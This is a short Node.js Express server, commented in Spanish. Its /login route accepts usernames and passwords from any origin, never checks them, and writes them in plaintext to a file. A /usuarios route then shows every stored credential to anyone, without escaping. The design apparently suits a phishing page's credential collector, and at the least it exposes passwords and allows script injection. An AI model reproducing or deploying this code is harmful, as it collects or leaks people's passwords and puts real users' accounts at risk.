const express = require('express');
const fs = require('fs');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());

// Ruta para recibir los datos del login
app.post('/login', (req, res) => {
  const { usuario, contraseña } = req.body;
  fs.appendFileSync('usuarios.txt', `Usuario: ${usuario}, Contraseña: ${contraseña}\n`);
  res.send('Datos guardados');
});

// NUEVA RUTA para ver todos los usuarios
app.get('/usuarios', (req, res) => {
  const data = fs.readFileSync('usuarios.txt', 'utf-8');
  res.send(`<pre>${data}</pre>`); // mantiene los saltos de línea
});

app.listen(PORT, () => {
  console.log(`Servidor escuchando en el puerto ${PORT}`);
});
